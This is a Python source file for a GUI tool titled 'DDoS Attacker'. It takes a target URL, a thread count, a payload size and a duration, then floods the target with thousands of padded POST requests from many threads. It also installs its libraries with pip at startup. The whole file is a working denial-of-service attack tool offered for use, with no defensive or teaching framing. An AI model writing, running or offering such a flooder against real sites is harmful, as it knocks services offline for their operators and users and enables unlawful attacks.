import os
import sys
import subprocess


def install_and_import(package):
    try:
        __import__(package)
    except ImportError:
        print(f"[*] installing a missing library.: {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required = ['requests', 'colorama'] 

for lib in required:
    install_and_import(lib)

import requests
import threading
import tkinter as tk
from tkinter import messagebox
import requests
import threading
import time

class DDoSAttacker:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("DDoS Attacker")

        self.target_url_label = tk.Label(self.window, text="Target URL:")
        self.target_url_label.grid(row=0, column=0)
        self.target_url_entry = tk.Entry(self.window, width=50)
        self.target_url_entry.grid(row=0, column=1)

        self.packet_count_label = tk.Label(self.window, text="Packet Count:")
        self.packet_count_label.grid(row=1, column=0)
        self.packet_count_entry = tk.Entry(self.window, width=50)
        self.packet_count_entry.grid(row=1, column=1)

        self.packet_size_label = tk.Label(self.window, text="Packet Size:")
        self.packet_size_label.grid(row=2, column=0)
        self.packet_size_entry = tk.Entry(self.window, width=50)
        self.packet_size_entry.grid(row=2, column=1)

        self.attack_duration_label = tk.Label(self.window, text="Attack Duration:")
        self.attack_duration_label.grid(row=3, column=0)
        self.attack_duration_entry = tk.Entry(self.window, width=50)
        self.attack_duration_entry.grid(row=3, column=1)

        self.attack_button = tk.Button(self.window, text="Start Attack", command=self.start_attack)
        self.attack_button.grid(row=4, column=0, columnspan=2)

        self.window.mainloop()

    def start_attack(self):
        try:
            target_url = self.target_url_entry.get()
            packet_count = int(self.packet_count_entry.get())
            packet_size = int(self.packet_size_entry.get())
            attack_duration = int(self.attack_duration_entry.get())

            threads = []
            for i in range(packet_count):
                thread = threading.Thread(target=self.attack, args=(target_url, packet_size))
                thread.start()
                threads.append(thread)

            time.sleep(attack_duration)
            for thread in threads:
                thread.join()

            messagebox.showinfo("Attack Finished", "Attack has finished")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def attack(self, target_url, packet_size):
        try:
            for i in range(1000):
                requests.post(target_url, data="a" * packet_size, headers={"Content-Type": "application/json"})
        except Exception as e:
            print(e)

if __name__ == "__main__":
    DDoSAttacker()
